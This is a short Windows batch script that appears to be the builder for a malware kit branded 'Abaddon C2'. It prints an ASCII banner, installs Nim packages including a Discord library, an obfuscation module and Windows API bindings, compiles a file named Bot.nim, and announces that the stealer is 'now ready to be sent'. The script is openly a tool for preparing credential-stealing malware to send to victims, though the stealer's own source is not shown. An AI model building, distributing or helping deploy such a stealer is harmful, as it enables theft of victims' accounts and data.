@echo off
cls

echo.
echo    _____ ___.               .___  .___             \u001b[35m _________  ________  \u001b[0m
echo   /  _  \\_ |__ _____     __| _/__| _/____   ____  \u001b[35m \_   ___ \ \_____  \ \u001b[0m
echo  /  /_\  \| __ \\__  \   / __ |/ __ |/  _ \ /    \ \u001b[35m /    \  \/  /  ____/ \u001b[0m
echo /    |    \ \_\ \/ __ \_/ /_/ / /_/ (  <_> )   |  \\u001b[35m \     \____/       \ \u001b[0m
echo \____|__  /___  (____  /\____ \____ |\____/|___|  /\u001b[35m  \______  /\_______ \\u001b[0m
echo         \/    \/     \/      \/    \/           \/ \u001b[35m         \/         \/\u001b[0m

echo [92mInstalling nim modules...[0m
nimble install dimscord
nimble install nimprotect
nimble install winim
nimble install pixie
timeout 2 > nul

echo.
echo [92mCompiling source...[0m
nim c .\Bot.nim
timeout 2 > nul

echo.
echo.
echo [92mCompiled successfully![0m Your stealer is now ready to be sent. 
echo.
timeout 5 > nul

